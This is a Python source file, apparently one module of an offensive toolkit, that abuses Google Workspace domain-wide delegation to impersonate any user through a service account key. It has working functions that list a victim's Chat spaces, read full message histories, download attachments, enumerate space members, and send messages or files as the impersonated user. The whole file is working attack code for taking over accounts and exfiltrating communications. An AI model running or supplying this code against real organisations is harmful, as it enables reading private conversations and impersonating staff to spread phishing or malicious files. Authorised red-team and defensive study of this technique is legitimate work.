#!/usr/bin/env python
"""
Chat Module for Domain Wide Delegation Abuse
Allows access to Google Chat data using service account with domain-wide delegation
"""

import json
import os
import base64
import mimetypes
from datetime import datetime
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from googleapiclient.http import MediaFileUpload
import re

# Scopes needed for Chat operations
SCOPES = ['https://www.googleapis.com/auth/chat.spaces',
          'https://www.googleapis.com/auth/chat.spaces.readonly',
          'https://www.googleapis.com/auth/chat.messages',
          'https://www.googleapis.com/auth/chat.messages.create',
          'https://www.googleapis.com/auth/chat.memberships',
          'https://www.googleapis.com/auth/chat.memberships.readonly']

def get_chat_service(service_account_key, impersonate_email):
    """
    Create a Chat service with domain-wide delegation
    """
    try:
        # Load service account credentials
        credentials = service_account.Credentials.from_service_account_file(
            service_account_key,
            scopes=SCOPES
        )
        
        # Impersonate the target user
        delegated_credentials = credentials.with_subject(impersonate_email)
        
        # Build the Chat service
        service = build('chat', 'v1', credentials=delegated_credentials)
        return service
    
    except Exception as e:
        print(f"[!] Error creating Chat service: {e}")
        return None

def listSpaces(service_account_key, impersonate_email):
    """
    List all Chat spaces accessible by the impersonated user
    """
    print(f"[*] Listing Chat spaces for {impersonate_email}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    try:
        # List all spaces
        spaces_result = service.spaces().list(pageSize=100).execute()
        spaces = spaces_result.get('spaces', [])
        
        print(f"\n[+] Found {len(spaces)} spaces:\n")
        
        for space in spaces:
            space_type = space.get('type', 'UNKNOWN')
            space_name = space.get('name', '')
            space_id = space_name.split('/')[-1] if space_name else 'N/A'
            
            print(f"  Space: {space.get('displayName', 'Unnamed Space')}")
            print(f"    ID: {space_id}")
            print(f"    Type: {space_type}")
            print(f"    Full Name: {space_name}")
            
            if space_type == 'SPACE':
                # It's a named space/room
                if 'spaceDetails' in space:
                    details = space['spaceDetails']
                    print(f"    Description: {details.get('description', 'No description')}")
                    print(f"    Guidelines: {details.get('guidelines', 'No guidelines')}")
                
                # Check if threaded
                if space.get('spaceThreadingState') == 'THREADED_MESSAGES':
                    print(f"    Threading: Enabled")
                elif space.get('spaceThreadingState') == 'GROUPED_MESSAGES':
                    print(f"    Threading: Grouped")
                else:
                    print(f"    Threading: Disabled")
                
                # Check space features
                if 'spaceHistoryState' in space:
                    print(f"    History: {space['spaceHistoryState']}")
            
            elif space_type == 'DIRECT_MESSAGE':
                print(f"    Direct Message Space")
            
            print("-" * 50)
        
        # Check for pagination
        if 'nextPageToken' in spaces_result:
            print(f"\n[*] More spaces available. Use pagination to retrieve all.")
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")
        if error.resp.status == 403:
            print("[!] Access denied. Make sure domain-wide delegation is properly configured.")

def listSpaceMessages(service_account_key, impersonate_email, space_id, max_results=100):
    """
    List messages in a specific Chat space
    """
    space_name = f"spaces/{space_id}"
    print(f"[*] Listing messages in space {space_id}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    try:
        # List messages in the space
        messages_result = service.spaces().messages().list(
            parent=space_name,
            pageSize=min(max_results, 100)
        ).execute()
        
        messages = messages_result.get('messages', [])
        
        if not messages:
            print("[*] No messages found in this space.")
            return
        
        print(f"\n[+] Found {len(messages)} messages:\n")
        
        for message in messages:
            print(f"  Message ID: {message['name'].split('/')[-1]}")
            
            # Sender information
            if 'sender' in message:
                sender = message['sender']
                sender_name = sender.get('displayName', 'Unknown')
                sender_email = sender.get('name', '').replace('users/', '')
                print(f"    From: {sender_name} ({sender_email})")
            
            # Message time
            if 'createTime' in message:
                print(f"    Time: {message['createTime']}")
            
            # Message content
            if 'text' in message:
                text = message['text'][:200] + '...' if len(message['text']) > 200 else message['text']
                print(f"    Text: {text}")
            
            # Check for cards
            if 'cards' in message or 'cardsV2' in message:
                print(f"    Contains: Card content")
            
            # Check for attachments
            if 'attachment' in message:
                attachments = message['attachment']
                print(f"    Attachments: {len(attachments)} files")
                for att in attachments[:3]:  # Show first 3
                    print(f"      - {att.get('name', 'Unknown')}")
            
            # Thread information
            if 'thread' in message:
                thread_name = message['thread'].get('name', '')
                thread_id = thread_name.split('/')[-1] if thread_name else 'N/A'
                print(f"    Thread ID: {thread_id}")
            
            print("-" * 50)
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")

def readMessages(service_account_key, impersonate_email, space_id, max_results=100):
    """
    Read full message content from a Chat space
    """
    space_name = f"spaces/{space_id}"
    print(f"[*] Reading messages from space {space_id}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    try:
        # Get messages
        messages_result = service.spaces().messages().list(
            parent=space_name,
            pageSize=min(max_results, 100)
        ).execute()
        
        messages = messages_result.get('messages', [])
        
        if not messages:
            print("[*] No messages found in this space.")
            return
        
        print(f"\n[+] Reading {len(messages)} messages:\n")
        
        for message in messages:
            msg_id = message['name'].split('/')[-1]
            
            print(f"\n{'='*60}")
            print(f"Message ID: {msg_id}")
            
            # Sender details
            if 'sender' in message:
                sender = message['sender']
                print(f"From: {sender.get('displayName', 'Unknown')} ({sender.get('name', '')})")
            
            # Time
            if 'createTime' in message:
                print(f"Sent: {message['createTime']}")
            
            # Full text content
            if 'text' in message:
                print(f"\nMessage:\n{message['text']}")
            
            # Formatted text
            if 'formattedText' in message:
                print(f"\nFormatted:\n{message['formattedText']}")
            
            # Cards content
            if 'cards' in message:
                print(f"\n[Card Content Present - {len(message['cards'])} cards]")
                for i, card in enumerate(message['cards']):
                    if 'header' in card:
                        print(f"  Card {i+1} Header: {card['header'].get('title', 'No title')}")
                    if 'sections' in card:
                        for section in card['sections']:
                            if 'widgets' in section:
                                for widget in section['widgets']:
                                    if 'textParagraph' in widget:
                                        print(f"    Text: {widget['textParagraph']['text']}")
            
            # Modern cards (cardsV2)
            if 'cardsV2' in message:
                print(f"\n[Modern Card Content - {len(message['cardsV2'])} cards]")
            
            # Attachments
            if 'attachment' in message:
                print(f"\nAttachments:")
                for att in message['attachment']:
                    print(f"  - Name: {att.get('name', 'Unknown')}")
                    print(f"    Content Name: {att.get('contentName', 'N/A')}")
                    print(f"    Content Type: {att.get('contentType', 'N/A')}")
                    if 'driveDataRef' in att:
                        drive_ref = att['driveDataRef']
                        print(f"    Drive File ID: {drive_ref.get('driveFileId', 'N/A')}")
                    if 'attachmentDataRef' in att:
                        data_ref = att['attachmentDataRef']
                        print(f"    Upload Reference: {data_ref.get('resourceName', 'N/A')}")
            
            # Annotations (mentions, etc.)
            if 'annotations' in message:
                for annotation in message['annotations']:
                    if annotation.get('type') == 'USER_MENTION':
                        user_mention = annotation.get('userMention', {})
                        mentioned_user = user_mention.get('user', {})
                        print(f"\nMentioned: @{mentioned_user.get('displayName', 'Unknown')}")
            
            # Thread info
            if 'thread' in message:
                thread = message['thread']
                print(f"\nThread: {thread.get('name', 'N/A')}")
        
        print(f"\n{'='*60}")
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")

def sendMessage(service_account_key, impersonate_email, space_id, text, thread_id=None):
    """
    Send a message to a Chat space
    """
    space_name = f"spaces/{space_id}"
    print(f"[*] Sending message to space {space_id}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    try:
        # Build message body
        message = {
            'text': text
        }
        
        # Add to thread if specified
        if thread_id:
            message['thread'] = {
                'name': f"spaces/{space_id}/threads/{thread_id}"
            }
        
        # Send the message
        result = service.spaces().messages().create(
            parent=space_name,
            body=message
        ).execute()
        
        print(f"[+] Message sent successfully!")
        print(f"    Message ID: {result['name'].split('/')[-1]}")
        
        if 'thread' in result:
            thread_id = result['thread']['name'].split('/')[-1]
            print(f"    Thread ID: {thread_id}")
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")

def sendMessageWithAttachment(service_account_key, impersonate_email, space_id, text, file_path, thread_id=None):
    """
    Send a message with an attachment to a Chat space
    """
    space_name = f"spaces/{space_id}"
    print(f"[*] Sending message with attachment to space {space_id}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    try:
        # First, upload the attachment
        if not os.path.exists(file_path):
            print(f"[!] File not found: {file_path}")
            return
        
        # Get file info
        file_name = os.path.basename(file_path)
        mime_type, _ = mimetypes.guess_type(file_path)
        if not mime_type:
            mime_type = 'application/octet-stream'
        
        print(f"[*] Uploading file: {file_name} ({mime_type})")
        
        # Upload the file
        media = MediaFileUpload(file_path, mimetype=mime_type)
        
        # Create attachment upload request
        attachment_upload = service.media().upload(
            parent=space_name,
            body={'filename': file_name},
            media_body=media
        ).execute()
        
        # Build message with attachment reference
        message = {
            'text': text,
            'attachment': [{
                'name': attachment_upload.get('name'),
                'contentName': file_name,
                'contentType': mime_type,
                'attachmentDataRef': {
                    'resourceName': attachment_upload.get('name')
                }
            }]
        }
        
        # Add to thread if specified
        if thread_id:
            message['thread'] = {
                'name': f"spaces/{space_id}/threads/{thread_id}"
            }
        
        # Send the message
        result = service.spaces().messages().create(
            parent=space_name,
            body=message
        ).execute()
        
        print(f"[+] Message with attachment sent successfully!")
        print(f"    Message ID: {result['name'].split('/')[-1]}")
        print(f"    Attachment: {file_name}")
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")
        if error.resp.status == 403:
            print("[!] Note: Uploading attachments requires user authentication with domain-wide delegation.")

def downloadAttachments(service_account_key, impersonate_email, space_id, max_results=100):
    """
    Download all attachments from a Chat space
    """
    space_name = f"spaces/{space_id}"
    print(f"[*] Downloading attachments from space {space_id}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    # Create download directory
    download_dir = f"chat_attachments_{space_id}"
    if not os.path.exists(download_dir):
        os.makedirs(download_dir)
    
    try:
        # Get messages with attachments
        messages_result = service.spaces().messages().list(
            parent=space_name,
            pageSize=min(max_results, 100)
        ).execute()
        
        messages = messages_result.get('messages', [])
        total_attachments = 0
        
        for message in messages:
            if 'attachment' not in message:
                continue
            
            msg_id = message['name'].split('/')[-1]
            
            for att in message['attachment']:
                att_name = att.get('contentName', f"attachment_{total_attachments}")
                
                print(f"[*] Downloading: {att_name}")
                
                # Check if it's a Drive file
                if 'driveDataRef' in att:
                    drive_file_id = att['driveDataRef'].get('driveFileId')
                    print(f"    Drive File ID: {drive_file_id}")
                    print(f"    [!] Note: Drive files should be downloaded using Drive API")
                    
                    # Save reference
                    ref_file = os.path.join(download_dir, f"{att_name}.drive_ref.txt")
                    with open(ref_file, 'w') as f:
                        f.write(f"Drive File ID: {drive_file_id}\n")
                        f.write(f"Original Name: {att_name}\n")
                        f.write(f"Message ID: {msg_id}\n")
                    
                    total_attachments += 1
                
                # Check for uploaded attachment
                elif 'attachmentDataRef' in att:
                    resource_name = att['attachmentDataRef'].get('resourceName')
                    
                    try:
                        # Get attachment data
                        attachment_data = service.media().download(
                            resourceName=resource_name
                        ).execute()
                        
                        # Save to file
                        file_path = os.path.join(download_dir, att_name)
                        with open(file_path, 'wb') as f:
                            f.write(attachment_data)
                        
                        print(f"    [+] Saved to: {file_path}")
                        total_attachments += 1
                    
                    except Exception as e:
                        print(f"    [!] Failed to download: {e}")
        
        print(f"\n[+] Downloaded {total_attachments} attachments to {download_dir}/")
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")

def getSpaceMembers(service_account_key, impersonate_email, space_id):
    """
    List all members of a Chat space
    """
    space_name = f"spaces/{space_id}"
    print(f"[*] Getting members of space {space_id}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    try:
        # List space members
        members_result = service.spaces().members().list(
            parent=space_name,
            pageSize=100
        ).execute()
        
        members = members_result.get('memberships', [])
        
        print(f"\n[+] Found {len(members)} members:\n")
        
        for member in members:
            member_name = member.get('name', '')
            member_id = member_name.split('/')[-1] if member_name else 'N/A'
            
            # Get member details
            if 'member' in member:
                user = member['member']
                display_name = user.get('displayName', 'Unknown')
                user_type = user.get('type', 'UNKNOWN')
                user_id = user.get('name', '').replace('users/', '')
                
                print(f"  Member: {display_name}")
                print(f"    User ID: {user_id}")
                print(f"    Type: {user_type}")
                
                if user_type == 'BOT':
                    print(f"    Bot Account")
            
            # Membership state
            state = member.get('state', 'UNKNOWN')
            print(f"    State: {state}")
            
            # Role in space
            role = member.get('role', 'MEMBER')
            print(f"    Role: {role}")
            
            # Join time
            if 'createTime' in member:
                print(f"    Joined: {member['createTime']}")
            
            print("-" * 40)
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")

def createSpace(service_account_key, impersonate_email, space_name, description="", threaded=True):
    """
    Create a new Chat space
    """
    print(f"[*] Creating new Chat space: {space_name}")
    
    service = get_chat_service(service_account_key, impersonate_email)
    if not service:
        return
    
    try:
        # Build space configuration
        space_config = {
            'displayName': space_name,
            'spaceType': 'SPACE'
        }
        
        # Add description if provided
        if description:
            space_config['spaceDetails'] = {
                'description': description
            }
        
        # Set threading state
        if threaded:
            space_config['spaceThreadingState'] = 'THREADED_MESSAGES'
        else:
            space_config['spaceThreadingState'] = 'UNTHREADED_MESSAGES'
        
        # Create the space
        space = service.spaces().create(body=space_config).execute()
        
        space_id = space['name'].split('/')[-1]
        
        print(f"[+] Space created successfully!")
        print(f"    Space ID: {space_id}")
        print(f"    Name: {space.get('displayName', 'N/A')}")
        print(f"    Type: {space.get('spaceType', 'N/A')}")
        
        return space_id
    
    except HttpError as error:
        print(f"[!] An error occurred: {error}")
        return None